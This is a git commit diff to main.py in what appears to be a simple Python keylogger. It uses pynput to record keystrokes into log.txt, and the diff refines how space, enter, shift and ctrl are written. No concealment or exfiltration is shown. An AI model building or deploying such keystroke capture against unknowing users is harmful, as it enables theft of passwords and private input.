da4e0a71a8b8827e487854d4ced160ace91f4fa5
Jaivardhan55 <141646873+Jaivardhan55@users.noreply.github.com>
2024-12-25 17:36:19 +0530

    Update main.py

--- main.py
+++ main.py
@@ -5,8 +5,16 @@ from pynput.keyboard import Listener
 def writetofile(key):
     letter = str(key)
     letter = letter.replace("'","")
-    if letter == "Key.space":
-        letter = " "
+    
+    if letter == 'Key.space':
+        letter = ' '
+    if letter == 'Key.shift_r':
+        letter = ''
+    if letter == "Key.ctrl_l":
+        letter = ""
+    if letter == "Key.enter":
+        letter = "\n"
+        
     with open("log.txt", 'a') as f:
         f.write(letter)
 
